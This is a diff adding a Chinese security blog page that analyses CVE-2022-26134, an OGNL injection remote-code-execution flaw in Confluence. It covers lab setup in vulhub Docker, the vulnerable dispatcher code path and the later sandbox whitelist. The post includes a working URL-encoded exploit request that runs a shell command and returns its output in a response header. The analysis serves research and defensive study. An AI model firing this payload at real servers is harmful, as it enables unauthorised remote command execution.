@@ -1,0 +1,283 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>CVE-2022-26134 Confluence OGNL RCE 漏洞分析 | 1jzz</title>
+<link rel="shortcut icon" href="https://1jzz.github.io/favicon.ico?v=1659229140591">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://1jzz.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="CVE-2022-26134 Confluence OGNL RCE 漏洞分析 | 1jzz - Atom Feed" href="https://1jzz.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="环境配置
+添加一个5050端口，给我们调试。
+version: '2'
+services:
+  web:
+    image: vulhub/confluence:7.13.6
+    ports:
+      - &quot;8090:8..." />
+    <meta name="keywords" content="java" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://1jzz.github.io">
+  <img class="avatar" src="https://1jzz.github.io/images/avatar.png?v=1659229140591" alt="">
+  </a>
+  <h1 class="site-title">
+    1jzz
+  </h1>
+  <p class="site-description">
+    当人生跌入谷底，剩下的每一步都是向上。
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              CVE-2022-26134 Confluence OGNL RCE 漏洞分析
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-06-19
+              </span>
+              <span>
+                5 min read
+              </span>
+              
+                <a href="https://1jzz.github.io/tag/gqY7ztfMX/" class="post-tag">
+                  # java
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <h1 id="环境配置">环境配置</h1>
+<p>添加一个5050端口，给我们调试。</p>
+<pre><code class="language-java">version: '2'
+services:
+  web:
+    image: vulhub/confluence:7.13.6
+    ports:
+      - &quot;8090:8090&quot;
+      - &quot;5050:5050&quot;
+    depends_on:
+      - db
+  db:
+    image: postgres:12.8-alpine
+    environment: 
+    - POSTGRES_PASSWORD=postgres
+    - POSTGRES_DB=confluence
+</code></pre>
+<p>进入容器/opt/atlassian/confluence/confluence/WEB-INF路径下使用docker cp命令将tlassian-bundled-plugins、atlassian-bundled-plugins-setup、lib文件拉取为依赖文件。<br>
+<code>sudo docker cp efd6f:/opt/atlassian/confluence/confluence/WEB-INF/atlassian-bundled-plugins ./</code><br>
+<code>sudo docker cp efd6f:/opt/atlassian/confluence/confluence/WEB-INF/atlassian-bundled-plugins-setup ./</code><br>
+<code>sudo docker cp efd6f:/opt/atlassian/confluence/confluence/WEB-INF/lib ./</code><br>
+将以上三个文件夹添加为依赖：<br>
+<img src="https://1jzz.github.io/post-images/1655604334151.png" alt="" loading="lazy"><br>
+配置IDEA远程debug：<br>
+<img src="https://1jzz.github.io/post-images/1655604575946.png" alt="" loading="lazy"><br>
+在容器/opt/atlassian/confluence/bin目录下修改setenv.sh文件，加入远程调试配置。<br>
+<img src="https://1jzz.github.io/post-images/1655604581362.png" alt="" loading="lazy"><br>
+接着运行<code>bash /opt/atlassian/confluence/bin/start-confluence.sh</code><br>
+去Atlassian官方申请一个Confluence Server的测试证书。<br>
+<img src="https://1jzz.github.io/post-images/1655604585163.png" alt="" loading="lazy"><br>
+测试数据库连接。<br>
+<img src="https://1jzz.github.io/post-images/1655604589076.png" alt="" loading="lazy"><br>
+至此，环境就已经搭建完了。</p>
+<h2 id="环境配置产生的问题">环境配置产生的问题</h2>
+<p><code>chown -R confluence.confluence confluence</code></p>
+<h1 id="漏洞利用">漏洞利用</h1>
+<pre><code class="language-http">GET /%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/ HTTP/1.1
+Host: your-ip:8090
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
+Connection: close
+</code></pre>
+<p>OGNL表达式：<code>${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&quot;id&quot;).getInputStream(),&quot;utf-8&quot;)).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader(&quot;X-Cmd-Response&quot;,#a))}</code><br>
+payload将执行完的命令转换为字符换并通过response中的X-Cmd-Response http header外带回显。<br>
+<img src="https://1jzz.github.io/post-images/1655604598406.png" alt="" loading="lazy"></p>
+<h1 id="漏洞分析">漏洞分析</h1>
+<p>以登录为例分析对请求的处理。<br>
+在<code>com.opensymphony.webwork.dispatcher.ServletDispatcher#service()</code>这个方法中开始对请求进行处理，之前的操作都是在tomcat中执行Filter的doFilter方法。接着调用了serviceAction对请求进行处理。<br>
+<img src="https://1jzz.github.io/post-images/1655604603868.png" alt="" loading="lazy"><br>
+在这个方法中传入了一个参数namespace，这是最重要的一个参数，是payload所在的地方。<br>
+我们可以看一看namespace是怎么获取的——截取到最后一个斜杠的内容，像这里的/login.action的话经过substring的截取之后赋值为空字符串。<br>
+<img src="https://1jzz.github.io/post-images/1655604607535.png" alt="" loading="lazy"><br>
+接着来到了<code>com.atlassian.confluence.servlet.ConfluenceServletDispatcher#serviceAction()</code>这个方法中，首先是通过ActionProxyFactory类中的静态方法getFactory获取到了DefaultActionProxyFactory工厂类实例，接着又调用了这个工厂类的createActionProxy方法实例化一个DefaultActionProxy对象，传入了namespace等参数。<br>
+<img src="https://1jzz.github.io/post-images/1655604611349.png" alt="" loading="lazy"><br>
+<img src="https://1jzz.github.io/post-images/1655604615484.png" alt="" loading="lazy"><br>
+接着调用<code>DefaultActionProxy#execute()</code>方法，其中调用了<code>DefaultActionInvocation#invoke()</code>方法。<br>
+<img src="https://1jzz.github.io/post-images/1655604619462.png" alt="" loading="lazy"><br>
+在invoke方法中，通过next方法遍历interceptos，并调用其intercept方法进行拦截。<br>
+<img src="https://1jzz.github.io/post-images/1655604628319.png" alt="" loading="lazy"><br>
+这里会对<code>DefaultActionInvocation#invoke()</code>方法进行迭代，直到返回了notpermitted这个resultCode之后才结束迭代。<br>
+<img src="https://1jzz.github.io/post-images/1655604633082.png" alt="" loading="lazy"><br>
+然后在<code>DefaultActionInvocation#executeResult()</code>方法中实例化了一个ActionChainResult对象，又调用了其execute方法。<br>
+<img src="https://1jzz.github.io/post-images/1655604647310.png" alt="" loading="lazy"><br>
+在<code>ActionChainResult#execute()</code>方法中，首先是获取了namespace的值，然后传入到了 <code>TextParseUtil#translateVariables()</code>方法中对其使用OGNL表达式进行解析。<br>
+<img src="https://1jzz.github.io/post-images/1655604651821.png" alt="" loading="lazy"><br>
+正则表达式匹配<code>${}</code>中的内容，最后在<code>Ognl#getValue()</code>中执行OGNL表达式，达到RCE的效果<br>
+<img src="https://1jzz.github.io/post-images/1655604658761.png" alt="" loading="lazy"><br>
+测试：<br>
+当我们传入${(4*4)}时，可以看到result为16。<br>
+<img src="https://1jzz.github.io/post-images/1655604666342.png" alt="" loading="lazy"></p>
+<h1 id="沙箱绕过">沙箱绕过</h1>
+<p>网上现在已经公开的一些利用方式简单粗暴，只能针对 v7.14 及以下系列有效，因为从 v7.15 系列开始，Confluence 在 OGNL 表达式解析时加入了沙箱设置。<br>
+这其中白名单是用于限制静态方法调用的，被限制在下面这几个类中：</p>
+<p>com.atlassian.confluence.util.GeneralUtil,<br>
+java.io.Serializable,<br>
+java.lang.reflect.Proxy,<br>
+net.sf.hibernate.proxy.HibernateProxy,<br>
+net.sf.cglib.proxy.Factory,<br>
+java.io.ObjectInputValidation,<br>
+net.java.ao.Entity,<br>
+net.java.ao.RawEntity,<br>
+net.java.ao.EntityProxyAccessor</p>
+<h1 id="参考">参考</h1>
+<p><a href="https://www.anquanke.com/post/id/274026">https://www.anquanke.com/post/id/274026</a><br>
+<a href="https://paper.seebug.org/1912/">https://paper.seebug.org/1912/</a></p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE">环境配置</a>
+<ul>
+<li><a href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E4%BA%A7%E7%94%9F%E7%9A%84%E9%97%AE%E9%A2%98">环境配置产生的问题</a></li>
+</ul>
+</li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">漏洞利用</a></li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">漏洞分析</a></li>
+<li><a href="#%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87">沙箱绕过</a></li>
+<li><a href="#%E5%8F%82%E8%80%83">参考</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://1jzz.github.io/post/tqualk1rS/">
+              <h3 class="post-title">
+                RMI实现及攻击方式
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  友链： <a href="https://www.cnblogs.com/sherlson/" target="_blank">sherlson</a>、<a href="https://cyberczy.github.io/" target="_blank">cyberczy</a>
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?d4b50d1451bf48cde435f45724be67b3";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+  <a class="rss" href="https://1jzz.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
